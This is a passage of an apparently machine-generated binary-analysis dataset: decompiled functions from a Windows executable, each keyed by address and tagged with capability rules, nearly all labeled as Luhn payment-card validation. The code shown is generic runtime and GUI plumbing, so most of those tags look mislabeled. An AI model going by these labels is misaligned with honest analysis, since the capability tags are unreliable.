        "decompiled_code": "\nvoid fcn.0042186c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x421919;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.0041ff94();\n    if ((cVar1 == '\\x12') || (cVar1 == '\\x14')) {\n        fcn.00421928();\n        fcn.00404850();\n    }\n    else {\n        cVar1 = fcn.00421a0c();\n        if (cVar1 == '\\x06') {\n            fcn.0041ffb8();\n        }\n        else if (cVar1 == '\\f') {\n            fcn.0041ffb8();\n        }\n        else {\n            fcn.0041fa94();\n        }\n        fcn.00404c14();\n        fcn.0041ffb8();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x421920;\n    uStack28 = 0x421918;\n    fcn.00404cd4();\n    return;\n}\n",
        "token_count": 299
    },
    "00421928": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00421928(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4219ff;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.0041ff94();\n    if ((cVar1 == '\\x06') || (cVar1 == '\\f')) {\n        fcn.0042186c();\n        fcn.00404e20();\n    }\n    else {\n        cVar1 = fcn.00421a0c();\n        if (cVar1 == '\\x12') {\n            fcn.0041ffb8();\n            fcn.00404f1c();\n            fcn.0041ffb8();\n        }\n        else if (cVar1 == '\\x14') {\n            fcn.0041ffb8();\n            fcn.00404c14();\n            fcn.0041ffb8();\n            fcn.00406668();\n        }\n        else {\n            fcn.0041fa94();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x421a06;\n    uStack32 = 0x4219f6;\n    fcn.004045c8();\n    uStack32 = 0x4219fe;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 356
    },
    "00421d00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __fastcall fcn.00421d00(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.00421d00::var_1h + 1;\n    uStack36 = 0x421d98;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &fcn.00421d00::var_1h + 1;\n    if (param_2 != '\\0') {\n        (**(*in_EAX + 0x24))();\n        fcn.00421830();\n        fcn.00421830();\n        puVar1 = puStack32;\n    }\n    while( true ) {\n        puStack32 = puVar1;\n        cVar2 = fcn.0041fc54();\n        if (cVar2 != '\\0') break;\n        fcn.00421cb8();\n        puVar1 = puStack32;\n    }\n    fcn.00420bbc();\n    while( true ) {\n        cVar2 = fcn.0041fc54();\n        if (cVar2 != '\\0') break;\n        fcn.00421d00();\n    }\n    fcn.00420bbc();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x421d9f;\n    uStack36 = 0x421d97;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 406
    },
    "00421f14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421f14(uint param_1, int32_t param_2)\n\n{\n    if (0 < param_2) {\n        do {\n            if (param_2 < 0x101) {\n                fcn.0041ffb8();\n                param_2 = 0;\n            }\n            else {\n                fcn.0041ffb8();\n                param_2 = param_2 + -0x100;\n            }\n        } while (0 < param_2);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "00421f5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421f5c(uint arg_8h)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x422105;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x421f88;\n    fcn.0041fb20();\n    puStack52 = 0x421f99;\n    fcn.004037f0();\n    uStack56 = 0x4220e0;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.004037f0();\n    fcn.0041ffb8();\n    fcn.0041ea14(var_10h, var_10h >> 0x1f);\n    fcn.0041ffb8();\n    puStack76 = 0x422002;\n    fcn.0041f3b0(0x400);\n    uStack80 = 0x4220bb;\n    iStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack76 = &stack0xfffffffc;\n    fcn.0042186c();\n    fcn.0041ffb8();\n    fcn.0041ea14(var_10h, var_10h >> 0x1f);\n    fcn.0041ffb8();\n    cVar1 = fcn.0041770c();\n    if (cVar1 != '\\0') {\n        fcn.00406298();\n        cVar1 = fcn.0040e664();\n        if (cVar1 != '\\0') goto code_r0x0042208e;\n    }\n    fcn.0040c998();\n    fcn.00403fc0();\ncode_r0x0042208e:\n    *in_EAX = *(var_14h + 4);\n    (**(_pe_dos_header + 0xc))();\n    *in_FS_OFFSET = var_10h;\n    iStack84 = 0x4220c2;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 621
    },
    "0042273c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042273c(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x24) = *0x422784;\n    if (param_1 != 0) {\n        fcn.004228f4();\n    }\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 187
    },
    "00422c94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422c94(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    bool bVar2;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    bVar2 = *0x10 == 0x14;\n    fcn.004049d4();\n    if (!bVar2) {\n        if (param_2 != 0) {\n            cVar1 = fcn.00408b78();\n            if (cVar1 == '\\0') {\n                uStack16 = 0xb;\n                iStack20 = param_2;\n                fcn.0040c9d4(0, &iStack20);\n                fcn.00403fc0();\n            }\n        }\n        if (in_EAX[1] == NULL) {\n            (**(*in_EAX + 0x20))(param_2);\n        }\n        else {\n            (**(*in_EAX[1] + 0x20))(param_2);\n        }\n        fcn.00422e14();\n        fcn.00422d20();\n        fcn.00422e14();\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "00423054": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00423054(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0042273c();\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 0x50) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 169
    },
    "00423244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00423244(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00403b58();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.004037f0();\n    *(in_EAX + 0xc) = in_ECX;\n    *(in_EAX + 0x10) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 187
    },
    "00423ba8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423ba8(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00422ab4();\n    uVar4 = 0x423d98;\n    uVar3 = 0x423dd0;\n    uVar2 = in_EAX;\n    uVar1 = in_EAX;\n    fcn.00423b80(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar3, uVar2, uVar4, uVar1);\n    uVar4 = 0x423d70;\n    uVar3 = 0x423db8;\n    uVar2 = in_EAX;\n    uVar1 = in_EAX;\n    fcn.00423b18(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar3, uVar2, uVar4, uVar1);\n    uVar4 = 0x423d84;\n    uVar3 = 0x423dc4;\n    uVar2 = in_EAX;\n    uVar1 = in_EAX;\n    fcn.00423b4c(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar3, uVar2, uVar4, uVar1);\n    uVar3 = 0x423d5c;\n    uVar1 = 0x423dac;\n    uVar2 = in_EAX;\n    fcn.00423af0(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar1, in_EAX, uVar3, uVar2);\n    return;\n}\n",
        "token_count": 403
    },
    "00423cbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423cbc(code *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00422b40(arg_8h, arg_ch);\n    if ((in_EAX == in_EDX) && (var_8h = fcn.00422d60(),  -1 < var_8h + -1)) {\n        do {\n            fcn.00422d34();\n            cVar1 = fcn.00403a28();\n            if (cVar1 == '\\0') {\n                (*arg_8h)();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00423ddc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00423ddc(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code **in_ECX;\n    \n    (**in_ECX)(arg_ch, arg_10h, arg_14h);\n    return 0;\n}\n",
        "token_count": 67
    },
    "0042540c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042540c(ushort param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    ushort extraout_CX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_CX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x20) = param_1;\n    sub.kernel32.dll_InitializeCriticalSection_1();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 170
    },
    "0042546c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042546c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection_1(in_EAX + 8);\n    return;\n}\n",
        "token_count": 41
    },
    "00425478": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00425478(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection_1(in_EAX + 8);\n    return;\n}\n",
        "token_count": 41
    },
    "00425624": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425624(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x42563c;\n    fcn.0042546c();\n    uStack32 = 0x425690;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = *(param_2 + 0x10);\n    puStack28 = &stack0xfffffffc;\n    iVar2 = fcn.00425484();\n    *(param_2 + 0x10) = iVar2;\n    if (iVar2 != iVar1) {\n        fcn.00403a28();\n    }\n    fcn.00425568();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x425697;\n    uStack32 = 0x42568f;\n    fcn.00425478();\n    return;\n}\n",
        "token_count": 257
    },
    "004256a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004256a0(int32_t param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4256b7;\n    fcn.0042546c();\n    uStack28 = 0x425702;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (param_1 != *(param_2 + 0x10)) {\n        *(param_1 + 4) = *(param_1 + 4) + 1;\n        *(param_2 + 0x10) = param_1;\n        puStack24 = &stack0xfffffffc;\n        fcn.00403a28();\n        fcn.00425568();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x425709;\n    uStack28 = 0x425701;\n    fcn.00425478();\n    return;\n}\n",
        "token_count": 253
    },
    "0042578c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0042578c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    puStack24 = 0x4257a3;\n    iVar1 = fcn.0041c8b0();\n    uStack28 = 0x425829;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    while (var_4h < *(iVar1 + 8)) {\n        fcn.0041c4c8();\n        fcn.00426d58();\n        var_4h = var_4h + 1;\n        fcn.0042706c();\n    }\n    fcn.00425710();\n    fcn.00425710();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x425830;\n    if (-1 < var_4h + -1) {\n        do {\n            uStack28 = 0x425815;\n            fcn.0041c4c8();\n            uStack28 = 0x42581a;\n            fcn.00426f44();\n            var_4h = var_4h + -1;\n        } while (var_4h != 0);\n    }\n    uStack28 = 0x425828;\n    fcn.0041c914();\n    return;\n}\n",
        "token_count": 353
    },
    "00425f64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00425f64(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    *0x483604 = 0;\n    uVar1 = fcn.00425484();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 0xff000008;\n    *(in_EAX + 0x1c) = *0x485898;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 207
    },
    "00425ffc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425ffc(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x426017;\n    cVar1 = fcn.004039b8();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x426027;\n        fcn.00425cbc();\n        uStack24 = 0x4260b7;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x42603f;\n        puStack20 = &stack0xfffffffc;\n        fcn.00425cbc();\n        uStack36 = 0x42609a;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.004256a0();\n        fcn.00426138();\n        if (*(in_EAX + 0x1c) != *(param_2 + 0x1c)) {\n            fcn.004263bc();\n            fcn.004263d8();\n        }\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x4260a1;\n        uStack36 = 0x426099;\n        fcn.00425ccc();\n        return;\n    }\n    puStack20 = 0x4260c9;\n    fcn.0041cae8();\n    return;\n}\n",
        "token_count": 399
    },
    "004262f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004262f4(void)\n\n{\n    fcn.00425eb0();\n    fcn.004260e8();\n    return;\n}\n",
        "token_count": 34
    },
    "00426360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426360(uint param_1, int32_t param_2)\n\n{\n    if (param_2 != 0) {\n        fcn.004260d0();\n        fcn.004031a8();\n        fcn.00404864();\n        fcn.00403098();\n        fcn.004260e8();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "00426320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00426320(void)\n\n{\n    fcn.004260d0();\n    fcn.004260e8();\n    return;\n}\n",
        "token_count": 33
    },
    "00426348": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00426348(void)\n\n{\n    fcn.0040482c();\n    return;\n}\n",
        "token_count": 24
    },
    "00426404": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426404(uint param_1, uchar param_2)\n\n{\n    fcn.004260d0(param_2);\n    fcn.004260e8();\n    return;\n}\n",
        "token_count": 46
    },
    "00426468": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00426468(void)\n\n{\n    fcn.004260d0();\n    fcn.004260e8();\n    return;\n}\n",
        "token_count": 33
    },
    "00426490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00426490(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00425484();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 4;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 174
    },
    "004264fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004264fc(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x426517;\n    cVar1 = fcn.004039b8();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x426527;\n        fcn.00425cbc();\n        uStack24 = 0x42659b;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x42653f;\n        puStack20 = &stack0xfffffffc;\n        fcn.00425cbc();\n        uStack36 = 0x42657e;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.004256a0();\n        fcn.004266e4();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x426585;\n        uStack36 = 0x42657d;\n        fcn.00425ccc();\n        return;\n    }\n    puStack20 = 0x4265ad;\n    fcn.0041cae8();\n    return;\n}\n",
        "token_count": 332
    },
    "00426624": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00426624(void)\n\n{\n    fcn.004265b4();\n    fcn.004265cc();\n    return;\n}\n",
        "token_count": 32
    },
    "00426700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00426700(void)\n\n{\n    fcn.004265b4();\n    fcn.004265cc();\n    return;\n}\n",
        "token_count": 32
    },
    "00426730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426730(uint param_1, int32_t param_2)\n\n{\n    if (-1 < param_2) {\n        fcn.004265b4();\n        fcn.004265cc();\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "0042675c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042675c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00425484();\n    *(in_EAX + 0x10) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 160
    },
    "004267c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004267c4(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x4267df;\n    cVar1 = fcn.004039b8();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x4267eb;\n        fcn.00425cbc();\n        uStack24 = 0x426854;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x426803;\n        puStack20 = &stack0xfffffffc;\n        fcn.00425cbc();\n        uStack36 = 0x426837;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.004256a0();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x42683e;\n        uStack36 = 0x426836;\n        fcn.00425ccc();\n        return;\n    }\n    puStack20 = 0x426866;\n    fcn.0041cae8();\n    return;\n}\n",
        "token_count": 322
    },
    "004268d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004268d8(uint param_1, uint param_2)\n\n{\n    fcn.00426888(*0x483884, *0x483888, param_2, *0x483890);\n    return;\n}\n",
        "token_count": 55
    },
    "00426a54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00426a54(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    sub.kernel32.dll_InitializeCriticalSection_1();\n    iVar1 = fcn.00425f64();\n    *(in_EAX + 0xc) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x427294;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.00426490();\n    *(in_EAX + 0x10) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x4272b4;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.0042675c();\n    *(in_EAX + 0x14) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x4272d4;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    *(in_EAX + 0x20) = 0xcc0020;\n    *(in_EAX + 8) = *0x426b14;\n    fcn.0041c828();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = in_EAX + 0x38;\n    }\n    return in_EAX;\n}\n",
        "token_count": 428
    },
    "00426bfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426bfc(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *arg_8h_00;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (arg_8h != NULL) {\n        cVar1 = (**(*arg_8h + 0x1c))();\n        if (cVar1 == '\\0') {\n            (**(*in_EAX + 0x10))();\n            fcn.00427120();\n            fcn.004268fc();\n            uVar2 = fcn.00425c78();\n            sub.gdi32.dll_SetBkColor(in_EAX[1], uVar2);\n            uVar2 = fcn.00425c78();\n            sub.gdi32.dll_SetTextColor(in_EAX[1], uVar2);\n            iVar3 = (**(*arg_8h + 0x20))();\n            iVar3 = iVar3 + var_4h;\n            arg_8h_00 = &var_14h;\n            (**(*arg_8h + 0x2c))();\n            fcn.0041b080(arg_8h_00, iVar3);\n            (**(*arg_8h + 0x14))();\n            (**(*in_EAX + 0xc))();\n        }\n    }\n    return;\n}\n",
        "token_count": 320
    },
    "00426eac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00426eac(void)\n\n{\n    ulong uStack16;\n    \n    fcn.00426e68();\n    return uStack16;\n}\n",
        "token_count": 35
    },
    "00426ec8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00426ec8(void)\n\n{\n    uint uStack12;\n    \n    fcn.00426e68();\n    return CONCAT44(uStack12, uStack12);\n}\n",
        "token_count": 41
    },
    "00426fb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
